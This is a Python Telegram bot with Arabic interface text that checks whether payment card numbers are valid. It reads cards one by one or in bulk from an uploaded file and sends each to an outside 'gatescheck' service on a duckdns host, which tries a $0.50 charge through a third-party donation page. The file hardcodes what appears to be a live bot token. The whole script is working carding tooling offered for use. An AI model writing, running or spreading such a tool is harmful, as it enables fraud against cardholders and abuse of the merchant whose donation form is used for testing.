import os
import re
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, CallbackQueryHandler

# توكن البوت
TOKEN = '8692960014:AAEpYPo0XTj8F2DmAeUgdaf9_w06MWFYDeI'

# رابط API
API_URL = "http://gatescheck.duckdns.org:7000/check"

# متغيرات للتحكم
fwa_single = False  # لتحديد إذا كنت تفحص بطاقة فردية
stop_flag = False  # لوقف فحص الملف

def check_card_api(card_number):
    params = {
        "url": "https://raybensch.com/donations/support-ray/",
        "card": f"{card_number}|09|28|092",
        "amount": 0.50
    }
    try:
        response = requests.get(API_URL, params=params)
        result = response.json().get('result', 'غير معروف')
        return result
    except Exception as e:
        return f"خطأ: {e}"

async def start(update: Update, context: CallbackContext):
    await update.message.reply_text('مرحبًا! أرسل لي ملف نصي ليفحص البطاقات. أو استخدم /pp لفحص بطاقة فردية.')

# أمر /pp لفحص بطاقة فردية
async def pp(update: Update, context: CallbackContext):
    global fwa_single
    fwa_single = True
    await update.message.reply_text('من فضلك أرسل لي رقم البطاقة للفحص الفردي.')

# أمر /stop لإيقاف فحص الملف
async def stop(update: Update, context: CallbackContext):
    global stop_flag
    stop_flag = True
    await update.message.reply_text('تم إيقاف الفحص.')

async def handle_message(update: Update, context: CallbackContext):
    global fwa_single, stop_flag
    if fwa_single:
        # هنا تستقبل رقم البطاقة للفحص الفردي
        card_number = update.message.text.strip()
        result = check_card_api(card_number)
        await update.message.reply_text(f"البطاقة: {card_number} - النتيجة: {result}")
        fwa_single = False
    else:
        # إذا لم يكن في وضع الفحص الفردي، افترض أن الرسالة ملف
        await update.message.reply_text("يرجى إرسال ملف نصي للفحص أو استخدم /pp لفحص بطاقة فردية.")
        
async def handle_file(update: Update, context: CallbackContext):
    global stop_flag
    stop_flag = False  # إعادة تعيين علم الإيقاف
    try:
        if not os.path.exists('downloads'):
            os.makedirs('downloads')

        file = await update.message.document.get_file()
        file_path = f"downloads/{file.file_id}.txt"
        await file.download_to_drive(file_path)

        # فحص الملف
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()

        for line in lines:
            if stop_flag:
                await update.message.reply_text("تم إيقاف الفحص.")
                break
            line = line.strip()
            card_number_matches = re.findall(r'\d+', line)
            if card_number_matches:
                card_number = card_number_matches[0]
                result = check_card_api(card_number)
                await update.message.reply_text(f"البطاقة: {line} - النتيجة: {result}")
            else:
                await update.message.reply_text(f"لم يتم العثور على رقم بطاقة في السطر: {line}")

    except Exception as e:
        await update.message.reply_text(f"حدث خطأ: {e}")

def main():
    import asyncio
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("pp", pp))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))

    app.run_polling()

if __name__ == '__main__':
    main()
